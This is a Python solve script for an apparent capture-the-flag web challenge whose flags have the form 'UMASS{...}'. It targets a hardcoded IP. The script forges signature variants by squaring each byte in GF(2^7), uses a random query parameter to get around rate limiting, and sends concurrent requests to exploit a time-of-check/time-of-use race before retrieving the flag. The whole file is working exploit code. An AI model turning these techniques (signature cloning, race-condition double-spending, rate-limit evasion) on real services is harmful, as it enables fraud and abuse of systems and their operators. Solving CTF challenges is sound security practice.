#!/usr/bin/env python3
import asyncio
import re
import sys
import requests
import aiohttp

BASE_URL = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://34.72.138.22"
TIMEOUT = 90

def gf2_7_square(a: int) -> int:
    """Square element in GF(2^7) with irreducible polynomial x^7 + x + 1."""
    p, b = 0, a
    for _ in range(7):
        if b & 1: p ^= a
        b >>= 1
        hi = a >> 6
        a = (a << 1) & 0x7F
        if hi: a ^= 0x03
    return p

def get_frob_variants(sig_hex: str, count: int) -> list[str]:
    """Generate the first `count` Frobenius variants of a signature."""
    variants, cur = [], bytes.fromhex(sig_hex)
    for _ in range(count):
        cur = bytes(gf2_7_square(b) for b in cur)
        variants.append(cur.hex())
    return variants

async def send_work_concurrently(uid: str, sigs: list[str]):
    """Send multiple /work requests simultaneously to exploit the TOCTOU race."""
    async def worker(i, sig):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(force_close=True)) as s:
            url = f"{BASE_URL}/work?x={i}" # Bypass rate limit
            async with s.post(url, json={"uid": uid, "sig": sig}, timeout=TIMEOUT) as r:
                return await r.text()
    return await asyncio.gather(*(worker(i, sig) for i, sig in enumerate(sigs)))

def solve():
    print(f"[*] Targeting {BASE_URL}")
    
    import time
    tag = str(int(time.time()))
    uid = re.search(r"uid is ([0-9a-f]+)", requests.get(f"{BASE_URL}/?x={tag}").text).group(1)
    print(f"[*] UID: {uid}")
    
    def get_next(sig=None):
        ts = str(time.time())
        if sig is None:
            return re.search(r"signature: ([0-9a-f]+)", requests.get(f"{BASE_URL}/buy", params={"uid": uid, "x": "buy"+ts}).text).group(1)
        resp = requests.post(f"{BASE_URL}/work?x=work"+ts, json={"uid": uid, "sig": sig}).text
        return re.search(r"stud is ([0-9a-f]+)", resp).group(1)

    sig0 = get_next()
    sig1 = get_next(sig0)
    sig2 = get_next(sig1)
    print(f"[*] Obtained sig_2: {sig2[:16]}...")

    # 2. Clone signatures using Frobenius
    clones = get_frob_variants(sig2, 7)[1:] # sig_2 is variants[0], use variants[1:7] (6 clones)
    print(f"[*] Generated 6 Frobenius clones")

    # 3. Race for the flag
    print(f"[*] Launching race condition with {len(clones)} clones...")
    asyncio.run(send_work_concurrently(uid, clones))
    
    # 4. Profit
    flag_resp = requests.get(f"{BASE_URL}/buy", params={"uid": uid, "x": "flag"}).text
    if "UMASS{" in flag_resp:
        flag = re.search(r"UMASS\{[^}]+\}", flag_resp).group(0)
        print(f"[+] Flag: {flag}")
    else:
        print("[-] Failed to get flag. Race might have failed.")

if __name__ == "__main__":
    solve()
